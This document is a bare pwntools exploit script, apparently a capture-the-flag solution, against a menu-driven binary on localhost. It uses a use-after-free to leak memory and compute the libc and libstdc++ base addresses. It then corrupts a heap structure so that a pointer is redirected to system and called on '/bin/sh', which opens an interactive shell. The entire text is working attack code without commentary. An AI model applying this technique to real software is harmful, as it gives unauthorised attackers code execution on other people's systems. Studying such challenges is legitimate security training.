from pwn import *

#p = process('./benchmark')
p = remote('localhost', 30030)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(0x30).encode())
p.sendlineafter(b': ', b'abcd')

sleep(0.1)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(0x30).encode())
p.sendlineafter(b': ', b'abcd')

sleep(0.1)

p.sendlineafter(b'> ', b'5')
p.recvuntil(b'arg: ')
p.recvuntil(b'arg: ')
leak = u64(p.recv(6)+b'\x00\x00') 
libc = leak + 0xeb9c0
libcpp = libc + 0x249000
print(hex(libc), hex(libcpp))

pay = p64(leak) + p64(1)
pay += p64(0xffffffff) + p64(0xa)
pay += p64(0x30) + p64(libcpp+0x226c38)
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'1')
p.sendafter(b': ', pay)

p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'0')
p.sendafter(b': ', p64(libc+0x50d70))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(0x30).encode())
p.sendlineafter(b': ', b'/bin/sh')

sleep(0.1)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'2')
p.recv()

p.interactive()